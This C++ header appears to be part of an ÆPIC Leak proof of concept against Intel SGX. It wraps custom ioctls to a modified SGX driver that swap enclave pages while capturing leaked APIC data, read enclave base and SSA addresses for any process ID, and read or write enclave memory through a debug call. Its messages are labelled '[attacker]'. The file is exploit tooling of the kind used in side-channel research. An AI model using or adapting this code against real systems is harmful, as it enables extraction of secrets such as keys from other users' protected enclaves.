#pragma once
#include <array>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

__attribute__((visibility("hidden"))) inline int isgx;

struct aepic_swap_page {
    __u64 pid;           // in
    __u64 encl_addr;     // in
    __u64 page_addr;     // in
    __u32 apic_leak[12]; // out
} __attribute__((__packed__));

struct aepic_data {
    __u64 encl_addr;      // in
    __u64 encl_base;      // out
    __u64 encl_size;      // out
    __u64 last_ticks_ewb; // out
    __u64 last_ewb_count; // out
    __u64 ssa_address;    // out
} __attribute__((__packed__));

struct aepic_dbg {
    __u64 encl_addr;
    __u64 encl_target;
    __u64 buffer;
    __u64 size;
    __u64 do_write;
} __attribute__((__packed__));

struct aepic_data_pid {
    __u64 pid;               // in
    __u64 enclaves;          // out
    __u64 enclave_ids[10];   // out: assume max 10 enclaves per process
    __u64 enclave_sizes[10]; // out
};

#define SGX_MAGIC      0xA4
#define AEPIC_SWAP_OUT _IOWR(SGX_MAGIC, 0xaa, struct aepic_swap_page)

#define AEPIC_SWAP_IN _IOWR(SGX_MAGIC, 0xab, struct aepic_swap_page)

#define AEPIC_GET_DATA _IOWR(SGX_MAGIC, 0xac, struct aepic_data)

#define AEPIC_DBG _IOWR(SGX_MAGIC, 0xad, struct aepic_dbg)

#define AEPIC_GET_DATA_PID _IOWR(SGX_MAGIC, 0xae, struct aepic_data_pid)

// aepic interface
inline std::array<uint32_t, 16> aepic_swap_page_out(char *page_address) {
    struct aepic_swap_page data;
    data.encl_addr = ((uint64_t)page_address) & ~0xFFF;
    data.page_addr = ((uint64_t)page_address) & ~0xFFF;
    data.pid       = 0;
    if ( ioctl(isgx, AEPIC_SWAP_OUT, &data) < 0 ) {
        printf("[attacker] aepic_swap_page_out ioctl error\n");
        close(isgx);
        exit(-1);
    }
    std::array<uint32_t, 16> ret {};
    std::memcpy(ret.data(), data.apic_leak, sizeof(uint32_t) * 12);
    return ret;
}

inline std::array<uint32_t, 16> aepic_swap_page_in(char *page_address) {
    struct aepic_swap_page data;
    data.encl_addr = ((uint64_t)page_address) & ~0xFFF;
    data.page_addr = ((uint64_t)page_address) & ~0xFFF;
    data.pid       = 0;
    if ( ioctl(isgx, AEPIC_SWAP_IN, &data) < 0 ) {
        printf("[attacker] aepic_swap_page_in ioctl error\n");
        close(isgx);
        exit(-1);
    }
    std::array<uint32_t, 16> ret {};
    std::memcpy(ret.data(), data.apic_leak, sizeof(uint32_t) * 12);
    return ret;
}

// aepic interface
inline std::array<uint32_t, 16> aepic_swap_page_out_pid(uint64_t pid, char *encl_base, char *page_address) {
    struct aepic_swap_page data;
    data.encl_addr = ((uint64_t)encl_base) & ~0xFFF;
    data.page_addr = ((uint64_t)page_address) & ~0xFFF;
    data.pid       = pid;
    if ( ioctl(isgx, AEPIC_SWAP_OUT, &data) < 0 ) {
        printf("[attacker] aepic_swap_page_out_pid ioctl error\n");
        close(isgx);
        exit(-1);
    }
    std::array<uint32_t, 16> ret {};
    std::memcpy(ret.data(), data.apic_leak, sizeof(uint32_t) * 12);
    return ret;
}

inline std::array<uint32_t, 16> aepic_swap_page_in_pid(uint64_t pid, char *encl_base, char *page_address) {
    struct aepic_swap_page data;
    data.encl_addr = ((uint64_t)encl_base) & ~0xFFF;
    data.page_addr = ((uint64_t)page_address) & ~0xFFF;
    data.pid       = pid;
    if ( ioctl(isgx, AEPIC_SWAP_IN, &data) < 0 ) {
        printf("[attacker] aepic_swap_page_in_pid ioctl error\n");
        close(isgx);
        exit(-1);
    }
    std::array<uint32_t, 16> ret {};
    std::memcpy(ret.data(), data.apic_leak, sizeof(uint32_t) * 12);
    return ret;
}

inline struct aepic_data aepic_get_data(char *encl_address) {
    struct aepic_data data;
    data.encl_addr = ((uint64_t)encl_address) & ~0xFFF;
    if ( ioctl(isgx, AEPIC_GET_DATA, &data) < 0 ) {
        printf("[attacker] aepic_get_data ioctl error\n");
        close(isgx);
        exit(-1);
    }
    return data;
}

inline struct aepic_data_pid aepic_get_data_pid(uint64_t pid) {
    struct aepic_data_pid data;
    data.pid = pid;
    if ( ioctl(isgx, AEPIC_GET_DATA_PID, &data) < 0 ) {
        printf("[attacker] aepic_get_data_pid ioctl error\n");
        close(isgx);
        exit(-1);
    }
    return data;
}

inline void aepic_dbg(void *address, void *buffer, size_t size, int do_write) {
    struct aepic_dbg data;
    data.encl_addr   = ((uint64_t)address) & ~0xFFF;
    data.encl_target = (uint64_t)address;
    data.buffer      = (uint64_t)buffer;
    data.size        = (uint64_t)size;
    data.do_write    = (uint64_t)do_write;

    if ( ioctl(isgx, AEPIC_DBG, &data) < 0 ) {
        printf("[attacker] aepic_dbg ioctl error\n");
        close(isgx);
        exit(-1);
    }
}

inline void aepic_edbgrd(void *address, void *buffer, size_t size) {
    aepic_dbg(address, buffer, size, 0);
}

inline void aepic_edbgwr(void *address, void *buffer, size_t size) {
    aepic_dbg(address, buffer, size, 1);
}